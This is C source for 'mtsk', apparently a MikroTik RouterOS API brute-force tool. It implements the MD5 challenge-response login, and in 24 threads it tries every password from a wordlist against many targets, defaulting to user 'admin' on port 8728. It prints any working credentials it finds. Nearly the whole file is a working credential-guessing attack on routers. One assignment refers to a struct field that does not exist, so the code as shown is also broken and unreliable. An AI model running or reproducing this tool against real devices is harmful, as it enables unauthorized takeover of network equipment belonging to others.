/*
 * This file is part of the mtsk distribution
 * (https://github.com/matricali/mtsk).
 *
 * Copyright (c) 2019 Jorge Matricali.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>

#include "hex.h"
#include "md5.h"
#include "socket.h"

#include "stringslist/stringslist.h"
#include "threadpool/threadpool.h"

#define BUF_SIZE 1024

typedef struct {
	char *target;
	uint16_t port;
	char *username;
	stringslist_t *passwords;
} mtsk_worker_args_t;

unsigned char pkt_login[] = { 0x06, 0x2f, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0x00 };
unsigned char pkt_login_rpl_1[] = { 0x05, 0x21, 0x64, 0x6f, 0x6e, 0x65, 0x25 };
unsigned char pkt_login_rpl_2[] = { 0x3d, 0x72, 0x65, 0x74, 0x3d };
unsigned char pkt_done[] = { 0x05, 0x21, 0x64, 0x6f, 0x6e, 0x65, 0x00 };

int mtsk_routeros_command_login(int sockfd, const char *username,
				const char *password)
{
	char buf[BUF_SIZE] = { 0 };
	unsigned char bdata[16] = { 0 };
	unsigned char digest[16];
	int nbytes = 0;

	mtsk_socket_write(sockfd, &pkt_login, 8);
	nbytes = mtsk_socket_read(sockfd, &buf, BUF_SIZE);

	if (nbytes < 45)
		return -1;

	if (nbytes > BUF_SIZE)
		return -2;

	if (strncmp((const char *)pkt_login_rpl_1, buf, 7) != 0)
		return -3;

	if (strncmp((const char *)pkt_login_rpl_2, &buf[7], 5) != 0)
		return -4;

	hex_to_bin(&buf[12], 32, bdata);

	// printf("-------CHALLENGE-------\n");
	// hex_dump(&bdata[0], 16);
	// printf("-----------------------\n");

	MD5_CTX ctx;
	MD5_Init(&ctx);
	MD5_Update(&ctx, "\x00", 1);
	MD5_Update(&ctx, password, strlen(password));
	MD5_Update(&ctx, &bdata, 16);
	MD5_Final(digest, &ctx);

	size_t username_len = strlen(username);
	char pkt[100] = { 0x06, 0x2f, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0 };
	pkt[7] = 6 + username_len;
	strncpy(&pkt[8], "=name=", 6);
	strncpy(&pkt[14], username, username_len);
	pkt[14 + username_len] = 0x2c; // 44
	strncpy(&pkt[15 + username_len], "=response=00", 12);
	hex_from_bin(digest, 16, &pkt[27 + username_len]);

	int final_len = 27 + username_len + 32;
	pkt[final_len++] = 0;

	mtsk_socket_write(sockfd, &pkt, final_len);

	memset(buf, 0, BUF_SIZE);
	nbytes = mtsk_socket_read(sockfd, &buf, BUF_SIZE);

	if (nbytes < 7)
		return -5;

	if (nbytes > BUF_SIZE)
		return -2;

	if (strncmp((const char *)pkt_done, buf, 7) != 0)
		return -6;

	return 0;
}

void worker(void *args)
{
	mtsk_worker_args_t *wargs = (mtsk_worker_args_t *)args;
	printf("Worker %d - %s:%d\n", getpid(), wargs->target, wargs->port);

	for (int i = 0; i < wargs->passwords->size; ++i) {
		int sockfd = mtsk_socket_connect(inet_addr(wargs->target),
						 wargs->port, 500000);

		if (sockfd > 0) {
			char *password = wargs->passwords->elements[i];
			if (strcmp(password, "\n") == 0) {
				password[0] = '\0';
			}
			int ret = mtsk_routeros_command_login(
				sockfd, wargs->username, password);
			if (ret == 0) {
				printf("%s:%d \"%s\" \"%s\" - OK\n",
				       wargs->target, wargs->port,
				       wargs->username, password);
				close(sockfd);
				return;
			} else {
				fprintf(stderr, "%s:%d \"%s\" \"%s\" - FAIL\n",
					wargs->target, wargs->port,
					wargs->username, password);
			}
		}
		if (sockfd > 0)
			close(sockfd);
	}
}

void mtsk_worker_add(threadpool_t *tp, char *target, uint16_t port,
		     char *username, stringslist_t *passwords)
{
	mtsk_worker_args_t *wargs = malloc(sizeof(mtsk_worker_args_t));

	if (wargs == NULL) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	wargs->target = target;
	wargs->port = port;
	wargs->username = username;
	wargs->passwords = passwords;
	wargs->connect_timeout = 500000;

	threadpool_add_work(tp, &worker, wargs);
}

static void mtsk_banner()
{
	puts("mtsk - MikroTik RouterOS API bruteforce v0.1");
	puts("https://github.com/matricali/mtsk");
	puts("");
}

static void mtsk_usage(char *name)
{
	printf("usage: %s [-vh] [-p PORT] [-u USERNAME]\n"
	       "\t-v, --version\tPrint software version.\n"
	       "\t-h, --help\tPrint this help.\n"
	       "\t-p, --port\tTarget port (default: 8728)\n"
	       "\t-u, --username\tUsername (default: admin)\n",
	       name);
	puts("");
}

int main(int argc, char **argv)
{
	int opt;
	int option_index = 0;
	uint16_t port = 8728;
	char *username = "admin";
	stringslist_t *passwords = NULL;
	threadpool_t *tp = NULL;

	static struct option long_options[] = {
		{ "version", no_argument, 0, 'v' },
		{ "help", no_argument, 0, 'h' },
		{ "port", required_argument, 0, 'p' },
		{ "username", required_argument, 0, 'u' },
		{ 0, 0, 0, 0 }
	};

	while ((opt = getopt_long(argc, argv, "vhp:u:", long_options,
				  &option_index)) != -1) {
		switch (opt) {
			case 'v':
				mtsk_banner();
				exit(EXIT_SUCCESS);
				break;

			case 'h':
				mtsk_banner();
				mtsk_usage(argv[0]);
				exit(EXIT_SUCCESS);
				break;

			case 'p':
				port = atoi(optarg);
				break;

			case 'u':
				username = strdup(optarg);
				break;

			case '?':
				/* getopt_long already printed an error message. */
				exit(EXIT_FAILURE);
				break;

			default:
				abort();
		}
	}

	/* Init worker threads */
	tp = threadpool_create(24);

	/* Load passwords */
	passwords = stringslist_load_file("passwords.txt");
	if (passwords == NULL) {
		fprintf(stderr, "Unable to load passworsd dictionary.\n");
		exit(EXIT_FAILURE);
	}
	printf("Loaded %d passwords.\n", passwords->size);

	/* Load targets from command line */
	while (optind < argc) {
		mtsk_worker_add(tp, strdup(argv[optind]), port,
				strdup(username), passwords);
		optind++;
	}

	if (!isatty(fileno(stdin))) {
		/* Load targets from STDIN */
		char line[BUFSIZ] = { 0 };
		char *tmp = NULL;

		while ((tmp = fgets(line, BUFSIZ, stdin)) != NULL) {
			line[strcspn(line, "\n")] = 0;
			mtsk_worker_add(tp, strdup(line), port,
					strdup(username), passwords);
		}
	}

	threadpool_wait(tp);
	threadpool_destroy(tp);

	return EXIT_SUCCESS;
}
